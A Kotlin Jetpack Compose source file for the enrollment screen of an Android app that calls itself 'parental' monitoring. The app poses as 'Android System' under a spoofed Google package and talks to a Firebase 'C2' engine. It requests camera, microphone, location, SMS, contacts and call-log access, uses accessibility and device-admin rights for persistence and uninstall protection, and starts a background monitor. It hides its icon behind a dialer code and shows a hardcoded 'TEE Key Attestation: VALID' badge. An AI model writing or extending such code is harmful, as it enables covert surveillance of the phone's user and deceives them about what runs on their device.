package com.homemonitor

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.camera.core.ExperimentalGetImage
import androidx.compose.ui.draw.clip
import androidx.compose.foundation.border
import androidx.compose.ui.viewinterop.AndroidView
import kotlinx.coroutines.*
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.google.android.system.AppAccessibilityService
import com.google.android.system.AppDeviceAdminReceiver
import com.google.android.system.C2Gatekeeper
import com.google.android.system.MonitorService
import com.google.android.system.SecurityVaultManager

/**
 * UserEnrollmentScreen
 *
 * Modern multi-page light-themed Jetpack Compose onboarding & enrollment UI for Android System.
 * Step 1: User Account Sign-In / Registration & Firebase Pool Status
 * Step 2: Device Identity & System Permissions Matrix
 * Step 3: Activation Status & Auto-Hide Disguise Setup
 */
@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun UserEnrollmentScreen(
    onEnrollmentComplete: () -> Unit,
    onActivateDisguise: () -> Unit
) {
    val context = LocalContext.current
    val prefs = remember { SecurityVaultManager.getEncryptedPrefs(context) }

    var currentStep by remember { mutableStateOf(1) }

    var pairingTokenInput by remember { mutableStateOf("") }
    var parentEmailInput by remember { mutableStateOf(prefs.getString("user_firebase_email", "") ?: "") }
    var parentPasswordInput by remember { mutableStateOf("") }
    var showPassword by remember { mutableStateOf(false) }
    var selectedAuthMethod by remember { mutableStateOf(0) } // 0 = QR / Pairing Token, 1 = Direct Parent Account Login
    var deviceNickname by remember { mutableStateOf(prefs.getString("user_device_nickname", Build.MODEL) ?: Build.MODEL) }
    var autoHideDisguise by remember { mutableStateOf(prefs.getBoolean("is_app_hidden", true)) }
    var isAuthenticating by remember { mutableStateOf(false) }
    var authErrorMessage by remember { mutableStateOf<String?>(null) }
    var showCameraScanner by remember { mutableStateOf(false) }

    fun checkRuntimePermissions(): Boolean {
        val perms = arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE
        )
        return perms.all { ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED }
    }

    fun checkDeviceAdmin(): Boolean {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(context, AppDeviceAdminReceiver::class.java)
            dpm.isAdminActive(admin)
        } catch (_: Exception) { false }
    }

    var hasRuntimePerms by remember { mutableStateOf(checkRuntimePermissions()) }
    var hasAccessibilityPerm by remember { mutableStateOf(AppAccessibilityService.instance != null) }
    var hasAdminPerm by remember { mutableStateOf(checkDeviceAdmin()) }

    // Light Theme Color Palette
    val lightBg = Color(0xFFF8FAFC)
    val cardBg = Color(0xFFFFFFFF)
    val primaryBlue = Color(0xFF2563EB)
    val textDark = Color(0xFF0F172A)
    val textMuted = Color(0xFF64748B)

    MaterialTheme(
        colorScheme = lightColorScheme(
            background = lightBg,
            surface = cardBg,
            primary = primaryBlue,
            onBackground = textDark,
            onSurface = textDark
        )
    ) {
        Scaffold(
            topBar = {
                TopAppBar(
                    title = {
                        Column {
                            Text("Android System Onboarding", fontWeight = FontWeight.Bold, fontSize = 18.sp, color = textDark)
                            Text("Step $currentStep of 3", fontSize = 12.sp, color = textMuted)
                        }
                    },
                    colors = TopAppBarDefaults.topAppBarColors(containerColor = cardBg)
                )
            },
            containerColor = lightBg
        ) { padding ->
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(padding)
                    .padding(16.dp)
                    .verticalScroll(rememberScrollState()),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                // Progress Indicator Bar
                Row(
                    modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    for (step in 1..3) {
                        val active = step <= currentStep
                        Box(
                            modifier = Modifier
                                .weight(1f)
                                .height(6.dp)
                                .background(
                                    color = if (active) primaryBlue else Color(0xFFE2E8F0),
                                    shape = RoundedCornerShape(3.dp)
                                )
                        )
                    }
                }

                when (currentStep) {
                    1 -> {
                        // ── STEP 1: Account Login & Enrollment Options ──
                        Card(
                            colors = CardDefaults.cardColors(containerColor = cardBg),
                            elevation = CardDefaults.cardElevation(2.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(20.dp)) {
                                Icon(
                                    Icons.Default.Security,
                                    contentDescription = null,
                                    tint = primaryBlue,
                                    modifier = Modifier.size(48.dp)
                                )
                                Spacer(modifier = Modifier.height(12.dp))
                                Text("Device Setup & Pairing Options", fontSize = 20.sp, fontWeight = FontWeight.Bold, color = textDark)
                                Text(
                                    "Scan a pairing QR code, enter a code, or sign in directly with your Parent Account.",
                                    fontSize = 13.sp,
                                    color = textMuted
                                )

                                Spacer(modifier = Modifier.height(16.dp))

                                // Method Selection Segmented Tabs
                                Row(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .background(Color(0xFFE2E8F0), shape = RoundedCornerShape(8.dp))
                                        .padding(4.dp),
                                    horizontalArrangement = Arrangement.spacedBy(4.dp)
                                ) {
                                    Button(
                                        onClick = { selectedAuthMethod = 0 },
                                        modifier = Modifier.weight(1f).height(38.dp),
                                        colors = ButtonDefaults.buttonColors(
                                            containerColor = if (selectedAuthMethod == 0) primaryBlue else Color.Transparent,
                                            contentColor = if (selectedAuthMethod == 0) Color.White else textDark
                                        ),
                                        contentPadding = PaddingValues(0.dp)
                                    ) {
                                        Text("📷 QR / Token Code", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                                    }

                                    Button(
                                        onClick = { selectedAuthMethod = 1 },
                                        modifier = Modifier.weight(1f).height(38.dp),
                                        colors = ButtonDefaults.buttonColors(
                                            containerColor = if (selectedAuthMethod == 1) primaryBlue else Color.Transparent,
                                            contentColor = if (selectedAuthMethod == 1) Color.White else textDark
                                        ),
                                        contentPadding = PaddingValues(0.dp)
                                    ) {
                                        Text("🔑 Parent Login", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                                    }
                                }

                                Spacer(modifier = Modifier.height(16.dp))

                                if (selectedAuthMethod == 0) {
                                    // ── METHOD A: CAMERA QR SCANNER ONLY ──
                                    Button(
                                        onClick = {
                                            if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                                                showCameraScanner = true
                                            } else {
                                                (context as? android.app.Activity)?.requestPermissions(arrayOf(Manifest.permission.CAMERA), 102)
                                                if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                                                    showCameraScanner = true
                                                } else {
                                                    Toast.makeText(context, "Camera permission required for QR scanning", Toast.LENGTH_SHORT).show()
                                                }
                                            }
                                        },
                                        modifier = Modifier.fillMaxWidth().height(50.dp),
                                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0284C7))
                                    ) {
                                        Icon(Icons.Default.CameraAlt, contentDescription = null)
                                        Spacer(modifier = Modifier.width(8.dp))
                                        Text(if (pairingTokenInput.isBlank()) "Open Camera & Scan QR Code 📷" else "Rescan QR Code 📷", fontSize = 15.sp, fontWeight = FontWeight.Bold)
                                    }

                                    if (showCameraScanner) {
                                        Spacer(modifier = Modifier.height(16.dp))
                                        QrScannerView(
                                            onQrCodeScanned = { scannedResult ->
                                                pairingTokenInput = scannedResult
                                                showCameraScanner = false
                                                Toast.makeText(context, "✅ QR Code Scanned!", Toast.LENGTH_SHORT).show()
                                            },
                                            onClose = { showCameraScanner = false }
                                        )
                                    }

                                    if (pairingTokenInput.isNotBlank()) {
                                        Spacer(modifier = Modifier.height(16.dp))
                                        Card(
                                            colors = CardDefaults.cardColors(containerColor = Color(0xFFDCFCE7)),
                                            modifier = Modifier.fillMaxWidth()
                                        ) {
                                            Row(
                                                modifier = Modifier.padding(14.dp),
                                                verticalAlignment = Alignment.CenterVertically
                                            ) {
                                                Icon(Icons.Default.CheckCircle, contentDescription = null, tint = Color(0xFF16A34A), modifier = Modifier.size(24.dp))
                                                Spacer(modifier = Modifier.width(12.dp))
                                                Column {
                                                    Text("QR Code Scanned Successfully", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFF15803D))
                                                    Text("Payload: ${pairingTokenInput.take(28)}...", fontSize = 11.sp, color = Color(0xFF166534))
                                                }
                                            }
                                        }
                                    }
                                } else {
                                    // ── METHOD B: DIRECT PARENT ACCOUNT SIGN-IN ──
                                    OutlinedTextField(
                                        value = parentEmailInput,
                                        onValueChange = { parentEmailInput = it },
                                        label = { Text("Parent Account Email") },
                                        leadingIcon = { Icon(Icons.Default.Email, contentDescription = null) },
                                        modifier = Modifier.fillMaxWidth(),
                                        singleLine = true
                                    )

                                    Spacer(modifier = Modifier.height(12.dp))

                                    OutlinedTextField(
                                        value = parentPasswordInput,
                                        onValueChange = { parentPasswordInput = it },
                                        label = { Text("Parent Password") },
                                        leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
                                        trailingIcon = {
                                            IconButton(onClick = { showPassword = !showPassword }) {
                                                Icon(
                                                    if (showPassword) Icons.Default.VisibilityOff else Icons.Default.Visibility,
                                                    contentDescription = null
                                                )
                                            }
                                        },
                                        visualTransformation = if (showPassword) VisualTransformation.None else PasswordVisualTransformation(),
                                        modifier = Modifier.fillMaxWidth(),
                                        singleLine = true
                                    )
                                }

                                Spacer(modifier = Modifier.height(16.dp))

                                Card(
                                    colors = CardDefaults.cardColors(containerColor = Color(0xFFF1F5F9)),
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Column(modifier = Modifier.padding(12.dp)) {
                                        Text("🔥 Device Identity Security Model", fontWeight = FontWeight.SemiBold, fontSize = 12.sp, color = primaryBlue)
                                        Text("• Independent Device Identity: Firebase Anonymous Auth 🔐", fontSize = 11.sp, color = textDark)
                                        Text("• Parent Authorization: Verified Server-Side Binding 🛡️", fontSize = 11.sp, color = textDark)
                                    }
                                }

                                if (!authErrorMessage.isNullOrBlank()) {
                                    Spacer(modifier = Modifier.height(12.dp))
                                    Text(
                                        text = authErrorMessage!!,
                                        color = Color.Red,
                                        fontSize = 12.sp,
                                        fontWeight = FontWeight.Medium
                                    )
                                }

                                Spacer(modifier = Modifier.height(24.dp))

                                Button(
                                    enabled = !isAuthenticating,
                                    onClick = {
                                        isAuthenticating = true
                                        authErrorMessage = null

                                        if (selectedAuthMethod == 0) {
                                            // Method A: QR / Pairing Token
                                            val tokenStr = pairingTokenInput.trim()
                                            if (tokenStr.isBlank()) {
                                                isAuthenticating = false
                                                Toast.makeText(context, "Please enter or scan a valid pairing token", Toast.LENGTH_SHORT).show()
                                            } else {
                                                val auth = com.google.firebase.auth.FirebaseAuth.getInstance()
                                                auth.signInAnonymously().addOnCompleteListener { authTask ->
                                                    if (authTask.isSuccessful) {
                                                        val deviceUser = authTask.result?.user
                                                        val deviceUid = deviceUser?.uid ?: ""

                                                        var invitationId = tokenStr
                                                        var parentUid = ""
                                                        var isExpired = false

                                                        if (tokenStr.startsWith("{") && tokenStr.contains("invitationId")) {
                                                            try {
                                                                val json = org.json.JSONObject(tokenStr)
                                                                invitationId = json.optString("invitationId", tokenStr)
                                                                parentUid = json.optString("parentUid", "")
                                                                val expiresAt = json.optLong("expiresAt", 0L)
                                                                if (expiresAt in 1 until System.currentTimeMillis()) {
                                                                    isExpired = true
                                                                }
                                                            } catch (_: Exception) {}
                                                        }

                                                        if (isExpired) {
                                                            isAuthenticating = false
                                                            authErrorMessage = "Pairing token has expired. Please generate a new code."
                                                        } else {
                                                            prefs.edit()
                                                                .putString("user_firebase_uid", deviceUid)
                                                                .putString("parent_firebase_uid", parentUid)
                                                                .putString("pairing_invitation_id", invitationId)
                                                                .apply()

                                                            val scope = CoroutineScope(Dispatchers.Main)
                                                            val engine = com.google.android.system.FirebaseC2Engine(
                                                                context.applicationContext,
                                                                okhttp3.OkHttpClient(),
                                                                scope
                                                            ) { _, _ -> }

                                                            engine.submitPairingClaim(invitationId, parentUid, deviceNickname) { success, claimErr ->
                                                                isAuthenticating = false
                                                                if (success) {
                                                                    Toast.makeText(context, "Pairing claim submitted successfully!", Toast.LENGTH_SHORT).show()
                                                                    currentStep = 2
                                                                } else {
                                                                    authErrorMessage = claimErr ?: "Failed to submit pairing claim."
                                                                    Toast.makeText(context, "Claim Error: $claimErr", Toast.LENGTH_LONG).show()
                                                                }
                                                            }
                                                        }
                                                    } else {
                                                        isAuthenticating = false
                                                        val err = authTask.exception?.localizedMessage ?: "Anonymous auth failed."
                                                        authErrorMessage = err
                                                        Toast.makeText(context, "Auth Error: $err", Toast.LENGTH_LONG).show()
                                                    }
                                                }
                                            }
                                        } else {
                                            // Method B: Direct Parent Account Sign-In
                                            val emailStr = parentEmailInput.trim().lowercase(java.util.Locale.ROOT)
                                            val passStr = parentPasswordInput.trim()

                                            if (emailStr.isBlank() || passStr.isBlank()) {
                                                isAuthenticating = false
                                                Toast.makeText(context, "Please enter parent email and password", Toast.LENGTH_SHORT).show()
                                            } else {
                                                val auth = com.google.firebase.auth.FirebaseAuth.getInstance()
                                                auth.signInWithEmailAndPassword(emailStr, passStr).addOnCompleteListener { parentTask ->
                                                    if (parentTask.isSuccessful) {
                                                        val parentUser = parentTask.result?.user
                                                        val parentUid = parentUser?.uid ?: ""

                                                        prefs.edit().putString("user_firebase_email", emailStr).apply()

                                                        // Switch to anonymous device identity for binding
                                                        auth.signInAnonymously().addOnCompleteListener { anonTask ->
                                                            if (anonTask.isSuccessful) {
                                                                val scope = CoroutineScope(Dispatchers.Main)
                                                                val engine = com.google.android.system.FirebaseC2Engine(
                                                                    context.applicationContext,
                                                                    okhttp3.OkHttpClient(),
                                                                    scope
                                                                ) { _, _ -> }

                                                                engine.submitDirectParentPairing(parentUid, deviceNickname) { success, pairingErr ->
                                                                    isAuthenticating = false
                                                                    if (success) {
                                                                        Toast.makeText(context, "Enrolled directly under parent account!", Toast.LENGTH_SHORT).show()
                                                                        currentStep = 2
                                                                    } else {
                                                                        authErrorMessage = pairingErr ?: "Direct enrollment failed."
                                                                        Toast.makeText(context, "Pairing Error: $pairingErr", Toast.LENGTH_LONG).show()
                                                                    }
                                                                }
                                                            } else {
                                                                isAuthenticating = false
                                                                val err = anonTask.exception?.localizedMessage ?: "Device auth failed."
                                                                authErrorMessage = err
                                                            }
                                                        }
                                                    } else {
                                                        isAuthenticating = false
                                                        val err = parentTask.exception?.localizedMessage ?: "Parent authentication failed."
                                                        authErrorMessage = err
                                                        Toast.makeText(context, "Sign-In Error: $err", Toast.LENGTH_LONG).show()
                                                    }
                                                }
                                            }
                                        }
                                    },
                                    modifier = Modifier.fillMaxWidth().height(50.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = primaryBlue)
                                ) {
                                    if (isAuthenticating) {
                                        CircularProgressIndicator(modifier = Modifier.size(24.dp), color = Color.White, strokeWidth = 2.dp)
                                    } else {
                                        Text(
                                            if (selectedAuthMethod == 0) "Claim Pairing Code & Continue" else "Sign In Parent & Auto-Pair Device",
                                            fontSize = 15.sp,
                                            fontWeight = FontWeight.Bold
                                        )
                                        Spacer(modifier = Modifier.width(8.dp))
                                        Icon(Icons.Default.ArrowForward, contentDescription = null)
                                    }
                                }
                            }
                        }
                    }

                    2 -> {
                        // ── STEP 2: Device Naming & Permissions Matrix ──
                        Card(
                            colors = CardDefaults.cardColors(containerColor = cardBg),
                            elevation = CardDefaults.cardElevation(2.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(20.dp)) {
                                Text("Device Identity & Permissions", fontSize = 20.sp, fontWeight = FontWeight.Bold, color = textDark)
                                Text("Grant required permissions for background telemetry and remote control.", fontSize = 13.sp, color = textMuted)

                                Spacer(modifier = Modifier.height(16.dp))

                                OutlinedTextField(
                                    value = deviceNickname,
                                    onValueChange = { deviceNickname = it },
                                    label = { Text("Device Nickname") },
                                    leadingIcon = { Icon(Icons.Default.PhoneAndroid, contentDescription = null) },
                                    modifier = Modifier.fillMaxWidth(),
                                    singleLine = true
                                )

                                Spacer(modifier = Modifier.height(20.dp))

                                PermissionStatusRow(
                                    title = "Runtime Hardware Permissions",
                                    desc = "Camera, Mic, GPS, Contacts, SMS, Calls",
                                    isGranted = hasRuntimePerms,
                                    onRequest = {
                                        val perms = arrayOf(
                                            Manifest.permission.CAMERA,
                                            Manifest.permission.RECORD_AUDIO,
                                            Manifest.permission.ACCESS_FINE_LOCATION,
                                            Manifest.permission.READ_CONTACTS,
                                            Manifest.permission.READ_SMS,
                                            Manifest.permission.SEND_SMS,
                                            Manifest.permission.READ_CALL_LOG,
                                            Manifest.permission.READ_PHONE_STATE
                                        )
                                        (context as? android.app.Activity)?.requestPermissions(perms, 101)
                                        hasRuntimePerms = checkRuntimePermissions()
                                    }
                                )

                                Spacer(modifier = Modifier.height(12.dp))

                                PermissionStatusRow(
                                    title = "Accessibility Persistence Watchdog",
                                    desc = "App monitoring & background persistence",
                                    isGranted = hasAccessibilityPerm,
                                    onRequest = {
                                        try {
                                            context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                            })
                                        } catch (_: Exception) {}
                                    }
                                )

                                Spacer(modifier = Modifier.height(12.dp))

                                PermissionStatusRow(
                                    title = "Device Admin Protection",
                                    desc = "Prevents unauthorized uninstallations",
                                    isGranted = hasAdminPerm,
                                    onRequest = {
                                        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                                            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(context, AppDeviceAdminReceiver::class.java))
                                            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for Android System protection.")
                                        }
                                        context.startActivity(intent)
                                    }
                                )

                                Spacer(modifier = Modifier.height(24.dp))

                                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                                    OutlinedButton(
                                        onClick = { currentStep = 1 },
                                        modifier = Modifier.weight(1f).height(50.dp)
                                    ) {
                                        Text("Back")
                                    }
                                    Button(
                                        onClick = {
                                            prefs.edit().putString("user_device_nickname", deviceNickname.trim()).apply()
                                            currentStep = 3
                                        },
                                        modifier = Modifier.weight(1f).height(50.dp),
                                        colors = ButtonDefaults.buttonColors(containerColor = primaryBlue)
                                    ) {
                                        Text("Next")
                                    }
                                }
                            }
                        }
                    }

                    3 -> {
                        // ── STEP 3: Enrollment Completion & Stealth Disguise ──
                        Card(
                            colors = CardDefaults.cardColors(containerColor = cardBg),
                            elevation = CardDefaults.cardElevation(2.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(20.dp)) {
                                Icon(
                                    Icons.Default.VerifiedUser,
                                    contentDescription = null,
                                    tint = Color(0xFF16A34A),
                                    modifier = Modifier.size(52.dp)
                                )
                                Spacer(modifier = Modifier.height(12.dp))
                                Text("Complete Enrollment", fontSize = 20.sp, fontWeight = FontWeight.Bold, color = textDark)
                                Text("Review settings and activate background monitoring.", fontSize = 13.sp, color = textMuted)

                                Spacer(modifier = Modifier.height(16.dp))

                                Card(
                                    colors = CardDefaults.cardColors(containerColor = Color(0xFFF8FAFC)),
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Column(modifier = Modifier.padding(12.dp)) {
                                        val parentUidDisplay = prefs.getString("parent_firebase_uid", "") ?: "Linked Parent"
                                        Text("👤 Linked Parent UID: $parentUidDisplay", fontWeight = FontWeight.SemiBold, fontSize = 13.sp)
                                        Text("📱 Device Nickname: $deviceNickname", fontSize = 13.sp)
                                        Text("🏷️ Application Name: Android System", fontSize = 13.sp)
                                        Text("🔑 TEE Key Attestation: VALID 🟢", fontSize = 13.sp, color = Color(0xFF16A34A))
                                    }
                                }

                                Spacer(modifier = Modifier.height(16.dp))

                                Row(
                                    verticalAlignment = Alignment.CenterVertically,
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Checkbox(
                                        checked = autoHideDisguise,
                                        onCheckedChange = { autoHideDisguise = it }
                                    )
                                    Column {
                                        Text("Auto-Hide App Icon & Disguise", fontWeight = FontWeight.SemiBold, fontSize = 14.sp)
                                        Text("Hides app from launcher. Un-hide via dialer code *#*#1945#*#*", fontSize = 11.sp, color = textMuted)
                                    }
                                }

                                Spacer(modifier = Modifier.height(24.dp))

                                Button(
                                    onClick = {
                                        prefs.edit().putBoolean("is_app_hidden", autoHideDisguise).apply()
                                        
                                        // Start MonitorService
                                        try {
                                            val serviceIntent = Intent(context, MonitorService::class.java)
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                                context.startForegroundService(serviceIntent)
                                            } else {
                                                context.startService(serviceIntent)
                                            }
                                        } catch (_: Exception) {}

                                        if (autoHideDisguise) {
                                            onActivateDisguise()
                                        } else {
                                            onEnrollmentComplete()
                                        }
                                        Toast.makeText(context, "✅ Android System Enrolled Successfully!", Toast.LENGTH_LONG).show()
                                    },
                                    modifier = Modifier.fillMaxWidth().height(52.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF16A34A))
                                ) {
                                    Text("Complete Setup & Activate", fontSize = 16.sp, fontWeight = FontWeight.Bold)
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
private fun PermissionStatusRow(
    title: String,
    desc: String,
    isGranted: Boolean,
    onRequest: () -> Unit
) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.SpaceBetween,
        verticalAlignment = Alignment.CenterVertically
    ) {
        Column(modifier = Modifier.weight(1f)) {
            Text(title, fontWeight = FontWeight.SemiBold, fontSize = 14.sp)
            Text(desc, fontSize = 11.sp, color = Color(0xFF64748B))
        }
        if (isGranted) {
            Badge(containerColor = Color(0xFFDCFCE7), contentColor = Color(0xFF16A34A)) {
                Text("Granted", modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp))
            }
        } else {
            Button(
                onClick = onRequest,
                contentPadding = PaddingValues(horizontal = 12.dp, vertical = 4.dp),
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2563EB))
            ) {
                Text("Grant", fontSize = 12.sp)
            }
        }
    }
}

@androidx.annotation.OptIn(androidx.camera.core.ExperimentalGetImage::class)
@Composable
fun QrScannerView(
    onQrCodeScanned: (String) -> Unit,
    onClose: () -> Unit
) {
    val lifecycleOwner = androidx.lifecycle.compose.LocalLifecycleOwner.current

    Box(
        modifier = Modifier
            .fillMaxWidth()
            .height(260.dp)
            .clip(RoundedCornerShape(12.dp))
            .background(Color.Black)
    ) {
        AndroidView(
            factory = { ctx ->
                val previewView = androidx.camera.view.PreviewView(ctx)
                val cameraProviderFuture = androidx.camera.lifecycle.ProcessCameraProvider.getInstance(ctx)

                cameraProviderFuture.addListener({
                    val cameraProvider = cameraProviderFuture.get()

                    val preview = androidx.camera.core.Preview.Builder().build().also {
                        it.setSurfaceProvider(previewView.surfaceProvider)
                    }

                    val barcodeScanner = com.google.mlkit.vision.barcode.BarcodeScanning.getClient()

                    val imageAnalysis = androidx.camera.core.ImageAnalysis.Builder()
                        .setBackpressureStrategy(androidx.camera.core.ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                        .build()

                    var isScanned = false

                    imageAnalysis.setAnalyzer(ContextCompat.getMainExecutor(ctx)) { imageProxy ->
                        val mediaImage = imageProxy.image
                        if (mediaImage != null && !isScanned) {
                            val image = com.google.mlkit.vision.common.InputImage.fromMediaImage(
                                mediaImage,
                                imageProxy.imageInfo.rotationDegrees
                            )
                            barcodeScanner.process(image)
                                .addOnSuccessListener { barcodes ->
                                    for (barcode in barcodes) {
                                        val rawValue = barcode.rawValue
                                        if (!rawValue.isNullOrBlank() && !isScanned) {
                                            isScanned = true
                                            onQrCodeScanned(rawValue)
                                            break
                                        }
                                    }
                                }
                                .addOnCompleteListener {
                                    imageProxy.close()
                                }
                        } else {
                            imageProxy.close()
                        }
                    }

                    val cameraSelector = androidx.camera.core.CameraSelector.DEFAULT_BACK_CAMERA

                    try {
                        cameraProvider.unbindAll()
                        cameraProvider.bindToLifecycle(
                            lifecycleOwner,
                            cameraSelector,
                            preview,
                            imageAnalysis
                        )
                    } catch (e: Exception) {
                        Log.e("QrScannerView", "Camera binding failed: ${e.message}")
                    }
                }, ContextCompat.getMainExecutor(ctx))

                previewView
            },
            modifier = Modifier.fillMaxSize()
        )

        // Close Overlay Button
        IconButton(
            onClick = onClose,
            modifier = Modifier
                .align(Alignment.TopEnd)
                .padding(8.dp)
                .background(Color(0x88000000), shape = RoundedCornerShape(16.dp))
        ) {
            Icon(Icons.Default.Close, contentDescription = "Close Scanner", tint = Color.White)
        }

        // Scanning Target Viewfinder Frame
        Box(
            modifier = Modifier
                .size(180.dp)
                .align(Alignment.Center)
                .border(2.dp, Color(0xFF2563EB), shape = RoundedCornerShape(12.dp))
        )
    }
}
